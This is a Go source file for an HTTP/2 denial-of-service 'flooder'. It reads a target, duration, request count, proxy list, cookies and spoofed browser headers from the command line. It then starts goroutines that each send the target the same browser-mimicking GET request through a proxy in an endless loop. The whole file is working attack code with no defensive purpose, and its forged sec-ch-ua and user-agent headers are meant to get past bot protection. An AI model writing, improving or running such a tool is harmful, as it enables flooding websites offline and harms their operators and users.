package main

import (
	"fmt"
	"golang.org/x/net/http2"
	"net/http"
	url2 "net/url"
	"time"
	"os"
	"strconv"
	"strings" 
)

type Attack struct {
	target string
	mode string
	trash int
	LoadedProxies string
	user_agent interface{}
	cookie interface{}	
	authority interface{}
	method_1 interface{}
	path interface{}
	scheme interface{}
	accept interface{}
	accept_e interface{}
	accept_l interface{}
	sec_ua interface{}
	sec_ua_m interface{}	
	sec_ua_p interface{}
	sec_fetch_d interface{}
	sec_fetch_m interface{}
	sec_fetch_s interface{}
	sec_fetch_u interface{}
	u_i_r interface{}
	
	
}

type Argstem struct {
	Banner string
	HTTP2Timeout int
	Attack *Attack
}	

var start = make(chan bool)
var UserAgents = make(map[int]string)
var LoadedProxies = make(map[int]string)
var RsIP int
var Args Argstem

func main() {
	var authority interface{}
	var method_1 interface{}
	var path interface{}
	var scheme interface{}
	var accept interface{}
	var accept_e interface{}
	var accept_l interface{}
	var sec_ua interface{}
	var sec_ua_m interface{}	
	var sec_ua_p interface{}
	var sec_fetch_d interface{}
	var sec_fetch_m interface{}
	var sec_fetch_s interface{}
	var sec_fetch_u interface{}
	var u_i_r interface{} 	
	var target string
	var requests int
	var proxies string
	var mode string
	var user_agent interface{}
	var times int	
	var cookie interface{}
	
	Arguments := os.Args[1:]
	for _, x := range Arguments {
		if strings.Contains(x, "target=") {
			target = strings.Split(x, "=")[1]
		}  else if strings.Contains(x, "time=") {
			times, _ = strconv.Atoi(strings.Split(x, "=")[1])
		} else if strings.Contains(x, "requests=") {
			requests, _ = strconv.Atoi(strings.Split(x, "=")[1])
		} else if strings.Contains(x, "mode=") {
			mode = strings.Split(x, "=")[1]
		} else if strings.Contains(x, "user_agent=") {
			user_agent = strings.Split(x, "user_agent=")[1]
		} else if strings.Contains(x, "cookie=") {
			cookie = strings.Split(x, "cookie=")[1]
		} else if strings.Contains(x, "proxy=") {
			proxies = strings.Split(x, "=")[1]
		} else if strings.Contains(x, "authority=") {
			authority = strings.Split(x, "authority=")[1]
		} else if strings.Contains(x, "method_1=") {
			method_1 = strings.Split(x, "method_1=")[1]
		} else if strings.Contains(x, "path=") {
			path = strings.Split(x, "path=")[1]
		} else if strings.Contains(x, "scheme=") {
			scheme = strings.Split(x, "scheme=")[1]
		} else if strings.Contains(x, "accept=") {
			accept = strings.Split(x, "accept=")[1]
		} else if strings.Contains(x, "accept_e=") {
			accept_e = strings.Split(x, "accept_e=")[1]
		} else if strings.Contains(x, "accept_l=") {
			accept_l = strings.Split(x, "accept_l=")[1]
		} else if strings.Contains(x, "sec_ua=") {
			sec_ua = strings.Split(x, "sec_ua=")[1]
		} else if strings.Contains(x, "sec_ua_m=") {
			sec_ua_m = strings.Split(x, "sec_ua_m=")[1]
		} else if strings.Contains(x, "sec_ua_p=") {
			sec_ua_p = strings.Split(x, "sec_ua_p=")[1]
		} else if strings.Contains(x, "sec_fetch_d=") {
			sec_fetch_d = strings.Split(x, "sec_fetch_d=")[1]
		}  else if strings.Contains(x, "sec_fetch_m=") {
			sec_fetch_m = strings.Split(x, "sec_fetch_m=")[1]
		} else if strings.Contains(x, "sec_fetch_s=") {
			sec_fetch_s = strings.Split(x, "sec_fetch_s=")[1]
		} else if strings.Contains(x, "sec_fetch_u=") {
			sec_fetch_u = strings.Split(x, "sec_fetch_u=")[1]
		} else if strings.Contains(x, "u_i_r=") {
			u_i_r = strings.Split(x, "u_i_r=")[1]
		} else {
			fmt.Println("--> Custom flooder browser")
		}
	}
	
	parsed := proxies
	prox := strings.Split(parsed, "\n")
	for i, p := range prox {
		LoadedProxies[i] = p
	}		

	New := Attack{
		target: target,
		mode: mode,
		trash: requests,
		cookie: cookie,
		authority: authority, 
		method_1: method_1, 
		path: path, 
		scheme: scheme, 
		accept: accept, 
		accept_e: accept_e,
		accept_l: accept_l,
		sec_ua: sec_ua, 
		sec_ua_m: sec_ua_m, 	
		sec_ua_p: sec_ua_p,
		sec_fetch_d: sec_fetch_d, 
		sec_fetch_m: sec_fetch_m, 
		sec_fetch_s: sec_fetch_s,
		sec_fetch_u: sec_fetch_u, 
		u_i_r: u_i_r, 
		user_agent: user_agent,		
	}
	
	Args = Argstem{
		HTTP2Timeout: 10000,
		Attack: &New,
	}
	
	for x := 0; x < requests; x++ {
		go HTTP2()
	}
	
	close(start)
	time.Sleep(time.Duration(times)*time.Second)	

}

func HTTP2() {
	proxy := LoadedProxies[0]
	
	target, err := url2.Parse(fmt.Sprintf("http://%s", proxy))
	
	Http2ProxyConfig := &http.Transport{
		Proxy: http.ProxyURL(target),
		DisableCompression: true,
		MaxIdleConns: 1,
		ForceAttemptHTTP2: true,
		TLSHandshakeTimeout: 10 * time.Second,
		DisableKeepAlives: false,
	}
	_, err = http2.ConfigureTransports(Http2ProxyConfig)
	if err != nil {
		fmt.Println("--> Error configurate flooders")
		return
	}
	client := http.Client{
		Timeout: time.Duration(Args.HTTP2Timeout)*time.Millisecond,
		Transport: Http2ProxyConfig,
	}
	req, err := http.NewRequest("GET", Args.Attack.target, nil)
	if err != nil {
		fmt.Println("--> Crash request")
		return
	}			
	
	//req.Header.Set("authority", Args.Attack.authority.(string))
	//req.Header.Set("method", Args.Attack.method_1.(string))
	//req.Header.Set("path", Args.Attack.path.(string))
	//req.Header.Set("scheme", Args.Attack.scheme.(string))
	req.Header.Set("accept", Args.Attack.accept.(string))
	req.Header.Set("accept-encoding", Args.Attack.accept_e.(string))
	req.Header.Set("accept-language", Args.Attack.accept_l.(string))
	req.Header.Set("cookie", Args.Attack.cookie.(string))
	req.Header.Set("sec-ch-ua", Args.Attack.sec_ua.(string))
	req.Header.Set("sec-ch-ua-mobile", Args.Attack.sec_ua_m.(string))	
	req.Header.Set("sec-ch-ua-platform", Args.Attack.sec_ua_p.(string))
	req.Header.Set("sec-fetch-dest", Args.Attack.sec_fetch_d.(string))
	req.Header.Set("sec-fetch-mode", Args.Attack.sec_fetch_m.(string))
	//req.Header.Set("sec-fetch-site", Args.Attack.sec_fetch_s.(string))
	//req.Header.Set("sec-fetch-user", Args.Attack.sec_fetch_u.(string))
	req.Header.Set("upgrade-insecure-requests", Args.Attack.u_i_r.(string))
	req.Header.Set("user-agent", Args.Attack.user_agent.(string))
	
	<-start
	
	for {
		t := time.NewTimer(1 * time.Second)
		_, err = client.Do(req)
		<-t.C
	}
}